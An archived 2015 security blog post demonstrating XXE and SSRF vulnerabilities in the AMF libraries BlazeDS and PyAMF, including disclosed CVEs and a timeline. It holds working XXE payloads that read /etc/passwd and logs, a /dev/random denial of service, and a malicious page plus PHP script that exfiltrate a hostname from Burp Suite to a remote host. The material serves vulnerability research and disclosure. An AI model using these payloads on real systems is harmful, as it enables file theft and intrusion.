---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2015-11-16_amf-parsing-and-xxe.md
original_filename: 2015-11-16_amf-parsing-and-xxe.md
title: AMF parsing and XXE
category: documents
detected_topics:
- supply-chain
- ssrf
- information-disclosure
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- supply-chain
- ssrf
- information-disclosure
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: c249f758e6424122bede803a58a93ebb212e81ffc00cb53d7b61f08cfe9db3c7
text_sha256: 20f90b31f574fc98875d2da0639ff2aa71e3c774e21671482302493d9c4b80c4
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# AMF parsing and XXE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2015-11-16_amf-parsing-and-xxe.md
- Source Type: markdown
- Detected Topics: supply-chain, ssrf, information-disclosure, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `c249f758e6424122bede803a58a93ebb212e81ffc00cb53d7b61f08cfe9db3c7`
- Text SHA256: `20f90b31f574fc98875d2da0639ff2aa71e3c774e21671482302493d9c4b80c4`


## Content

---
title: "AMF parsing and XXE"
page_title: "AMF parsing and XXE | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2015/12/17/amf_parsing_and_xxe/index.html"
final_url: "https://www.agarri.fr/blog/archives/2015/12/17/amf_parsing_and_xxe/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["BlazeDS", "PyAMF"]
bugs: ["XXE"]
publication_date: "2015-11-16"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6328
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2015](https://www.agarri.fr/blog/archives/2015/index.html) > [12](https://www.agarri.fr/blog/archives/2015/12/index.html) >  
[<](https://www.agarri.fr/blog/archives/2014/10/15/bypassing_blacklists_based_on_ipy/index.html) 19:16:50 [>](https://www.agarri.fr/blog/archives/2016/02/06/deserialization_in_perl_v5_8/index.html)

##  jeudi 17 décembre 2015, 19:16:50 (UTC+0100) 

### AMF parsing and XXE

  * Context

I recently played with two libraries parsing the AMF (aka [Action Message Format](https://en.wikipedia.org/wiki/Action_Message_Format)) binary format: [BlazeDS](https://github.com/apache/flex-blazeds) and [PyAMF](https://github.com/hydralabs/pyamf). Both libraries were affected by XXE and SSRF vulnerabilities. In fact, I found the vulnerability affecting PyAMF while developing an exploit for the BlazeDS's one ;-)

  

First, a timeline:  
\- March 2015: publication by the Apache Software Foundation of BlazeDS [4.7.0](http://mail-archives.apache.org/mod_mbox/www-announce/201503.mbox/%3C000001d060dc$c18b2e20$44a18a60$@apache.org%3E), their first release. Prior versions were published by Adobe (who donated the code to the ASF)  
\- August 2015: publication of BlazeDS 4.7.1 including a patch for CVE-2015-3269, a XXE vulnerability [disclosed](http://codewhitesec.blogspot.fr/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html) by [Matthias Kaiser](https://twitter.com/matthias_kaiser)  
\- October 2015: publication of Burp Suite [1.6.29](http://releases.portswigger.net/2015/10/1629.html) including an upgrade to BlazeDS 4.7.1 and disabling AMF parsing by default  
\- November 2015: publication of BlazeDS [4.7.2](http://mail-archives.us.apache.org/mod_mbox/www-announce/201511.mbox/%3Cop.x8ccmi0dn9yd54@christofers-macbook-pro.local%3E) including a patch for CVE-2015-5255, a SSRF vulnerability [disclosed](https://twitter.com/albinowax/status/667385930202882049) by [James Kettle](https://twitter.com/albinowax)  
\- December 2015: publication of Burp Suite [1.6.31](http://releases.portswigger.net/2015/12/1631.html) including an upgrade to BlazeDS 4.7.2  
\- December 2015: publication of PyAMF [0.8](https://github.com/hydralabs/pyamf/releases/tag/v0.8.0) including a patch for CVE-2015-8549, a XXE/SSRF vulnerability [disclosed](http://www.ocert.org/advisories/ocert-2015-011.html) by myself

  

The basic AMF client I wrote can by used to exploit both libraries. I'll cover three setups:  
\- the target is an AMF gateway based on PyAMF and hosting a service echoing back its input  
\- the target is an AMF gateway running Java and BlazeDS  
\- the target is a Java client (here Burp Suite 1.6.28) running BlazeDS

  

Please note that the second scenario is the more prevalent one, being similar to unpatched products from Adobe (ColdFusion and LiveCycle Data Services), VMware (vCenter Server, vCloud Director and Horizon View) and other vendors.

  

  * Setup #1

The following code will run an AMF gateway hosting two services, "echo" and "42" (download it from [here](/docs/amf_srv.py)). You will need to install the PyAMF module first, either from PIP ("pip install pyamf"), Github (clone this [repo](https://github.com/hydralabs/pyamf) then "python setup.py install") or your preferred packet manager ("apt-get install python-pyamf" under Ubuntu).
  
  
  #################
  # Configuration #
  #################
  
  port = 8081
  ip = '127.0.0.1'
  
  #########################
  # Proposed AMF services #
  #########################
  
  def echo(data):
  return data
  
  def fortytwo(data):
  sentence = """
  What do you get if you multiply six by nine?
  Six by nine. Forty two.
  That's it. That's all there is.
  I always thought something was fundamentally wrong with the universe."""
  return sentence
  
  services = { 'echo': echo, '42': fortytwo }
  
  #############
  # Main code #
  #############
  
  if __name__ == '__main__':
  
  from pyamf.remoting.gateway.wsgi import WSGIGateway
  from wsgiref import simple_server
  from pyamf import _version
  
  gw = WSGIGateway(services)
  httpd = simple_server.WSGIServer((ip, port), simple_server.WSGIRequestHandler)
  
  def app(environ, start_response):
  return gw(environ, start_response)
  
  httpd.set_app(app)
  
  print '[+] AMF gateway starting on %s:%d' % (ip, port)
  print '[+] PyAMF version: v%s' % str(_version.version)
  
  try:
  httpd.serve_forever()
  except KeyboardInterrupt:
  print
  print '[+] Bye!'
  pass
  

Let's send to the "echo" service an AMF message containing some XML:
  
  
  $ ./amf_xxe.py http://192.168.22.201:8081/ echo internal
  [+] Target URL: 'http://192.168.22.201:8081/'
  [+] Target service: 'echo'
  [+] Payload 'internal': '<!DOCTYPE x [ <!ENTITY foo "Some text"> ]><x>Internal entity: &foo;</x>'
  [+] Sending the request...
  [+] Response code: 200
  [+] Body:
  ........foobar/onResult..null......C<x>Internal entity: Some text</x>
  [+] Done
  

As we can see in the response, the internal entity named "foo" is resolved. This looks promising! Now let's try with an external entity pointing to /etc/group:
  
  
  $ ./amf_xxe.py http://192.168.22.201:8081/ echo ext_group
  [+] Target URL: 'http://192.168.22.201:8081/'
  [+] Target service: 'echo'
  [+] Payload 'ext_group': '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///etc/group"> ]><x>External entity 1: &foo;</x>'
  [+] Sending the request...
  [+] Response code: 200
  [+] Body:
  ........foobar/onResult..null.......i<x>External entity 1: root:x:0:
  daemon:x:1:
  bin:x:2:
  [...]
  xbot:x:1000:
  </x>
  [+] Done
  

Great, PyAMF is vulnerable to XXE! However, if there's no AMF service echoing back its input, possibilities are limited because #1 remote URLs are disabled (at least on my testbed) #2 no fancy URL handlers are available #3 generic error messages are used. At least, DoSing the server by requesting /dev/random is doable even if available services are unknown, because AMF parsing happens before AMF routing:
  
  
  $ ./amf_xxe.py http://192.168.22.201:8081/ wtf ext_rand
  [+] Target URL: 'http://192.168.22.201:8081/'
  [+] Target service: 'wtf'
  [+] Payload 'ext_rand': '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///dev/random"> ]><x>External entity 2: &foo;</x>'
  [+] Sending the request...
  [!] Connection OK, but a timeout was reached...
  [+] Done
  

  

  * Setup #2

BlazeDS is much easier to exploit than PyAMF because we can use #1 Java URL handlers (http, ftp, jar, …) to SSRF the internal network or retrieve a dynamic DTD #2 verbose error messages to leak information #3 directory listing via "file///" to locate interesting files. And like for PyAMF, we don't need to know the name of an existing service... The testbed is based on a [nightly build](http://sourceforge.net/adobe/blazeds/wiki/download%20blazeds%204/) (in turnkey format) from 2011. Unzip the archive, move to the Tomcat "bin" directory and execute "startup.sh": you can now access a (super old) AMF gateway at http://127.0.0.1:8400/samples/messagebroker/amf

  

Exploitation is trivial: retrieve an external DTD, read a local file and construct, from its content, an invalid URL (with protocol "_://") which will be displayed in error messages:
  
  
  $ ./amf_xxe.py http://127.0.0.1:8400/samples/messagebroker/amf  foo prm_url
  [+] Target URL: 'http://127.0.0.1:8400/samples/messagebroker/amf'
  [+] Target service: 'foo'
  [+] Payload 'prm_url': '<!DOCTYPE x [ <!ENTITY % foo SYSTEM "http://somewhere/blazeds.dtd"> %foo; ]><x>Parameter entity 3</x>'
  [+] Sending the request...
  [+] Response code: 200
  [+] Body:
  ........foobar/onStatus.......
  .Siflex.messaging.messages.ErrorMessage.headers.rootCause body.correlationId.faultDetail.faultString.clientId.timeToLive.destination.timestamp.extendedData.faultCode.messageId
  ........[Error deserializing XML type no protocol: _://root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
  bin:x:2:2:bin:/bin:/bin/sh
  sys:x:3:3:sys:/dev:/bin/sh
  [...]
  jetty:x:131:143::/usr/share/jetty:/bin/false
  ............Bu......../Client.Message.Encoding.I707E4DB6-DB0B-6FED-EC4C-01259078D48B
  [+] Done
  

Dynamic DTD leaking /etc/passwd via error messages:
  
  
  <!ENTITY % yolo SYSTEM 'file:///etc/passwd'>
  <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM '_://%yolo;'>">
  %c;
  %rrr;
  

Another dynamic DTD, leaking Tomcat logs:
  
  
  <!ENTITY % yolo SYSTEM 'file:///proc/self/cwd/../logs/catalina.YYYY-MM-DD.log'>
  <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM '_://%yolo;'>">
  %c;
  %rrr;
  

  

  * Setup #3

Looking at Burp Suite, it appears that we first have to trigger AMF parsing. On old vulnerable versions, having a response with "Content-Type: application/x-amf" going through the Proxy tool is enough. Given we don't have access to Burp error messages, we'll use a dynamic DTD and OOB communications to send data to a third-party server.

  

Malicious Web page loading an invisible "image":
  
  
  <html><body>
  Burp Suite + BlazeDS
  <img src="http://somewhere/img.php" style="visibility:hidden"/>
  </body></html>
  

Script "img.php" emitting a AMF response loading a remote DTD via parameter entities:
  
  
  <?php
  
  function amf_exploit() {
  $header = pack('H*','00030000000100036162630003646566000000ff0a000000010f');
  $xml = '<!DOCTYPE x [ <!ENTITY % dtd SYSTEM "http://somewhere/burp-xxe/dyndtd.xml"> %dtd; ]><x/>';
  $xml_sz = pack('N', strlen($xml));
  return ($header . $xml_sz . $xml);	
  }
  
  header('Content-Type: application/x-amf');
  print(amf_exploit());
  
  ?>
  

Dynamic DTD leaking /etc/hostname to a remote server:
  
  
  <!ENTITY % yolo SYSTEM 'file:///etc/hostname'>
  <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://somewhere/burp-xxe/burped?%yolo;'>">
  %c;
  %rrr;
  

In the attacker's logs, we can see the requests made by the browser _and_ by the BlazeDS library:
  
  
  "GET /burp-xxe/img.php HTTP/1.1" 200 301 "http://malicious/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:41.0) Gecko/20100101 Firefox/41.0"
  "GET /burp-xxe/dyndtd.xml HTTP/1.1" 200 423 "-" "Java/1.8.0_65"
  "GET /burp-xxe/burped?demobox HTTP/1.1" 404 437 "-" "Java/1.8.0_65"
  

And we learned that the vulnerable Burp Suite instance was running "Java 1.8.0_65" on a machine named "demobox".

  

  * AMF client

Constructing AMF packets is quite easy: the specifications are public ([AMF0](http://download.macromedia.com/pub/labs/amf/amf0_spec_121207.pdf) and [AMF3](http://download.macromedia.com/pub/labs/amf/amf3_spec_121207.pdf)) and reading [Wikipedia](https://en.wikipedia.org/wiki/Action_Message_Format#AMF_self-contained_packet) may be just as good.

  

An AMF packet includes a version number, some headers (none here) and some bodies (one here):
  
  
  version = '\x00\x03' # Version
  headers = '\x00\x00' # No headers
  bodies = '\x00\x01' + body # One body
  packet = version + headers + bodies
  

Inside the body, we need a valid "target_uri" in order to hit business-specific features. If we are interested only in AMF and XML parsing, any value can be used:
  
  
  target_uri = encode(svc) # Target URI
  response_uri = encode('foobar') # Response URI
  sz_msg = struct.pack("!L", len(msg))
  body = target_uri + response_uri + sz_msg + msg
  

The message itself is very basic: a single-entry AMF array containing the XML document:
  
  
  array_with_one_entry = '\x0a' + '\x00\x00\x00\x01' # AMF0 Array
  msg = array_with_one_entry + encode(xml_str, xml=True)
  

All strings (URI and XML) are encoded and prefixed with their size:
  
  
  def encode(string, xml=False):
  string = string.encode('utf-8')
  if xml:
  const = '\x0f' # AMF0 XML document
  size = struct.pack("!L", len(string)) # Size on 4 bytes
  else:
  const = '' # AMF0 URI
  size = struct.pack("!H", len(string)) # Size on 2 bytes
  return const + size + string
  

The full script can be download from [this](/docs/amf_xxe.py) URL. Enjoy!

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2015/12/17/amf_parsing_and_xxe/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
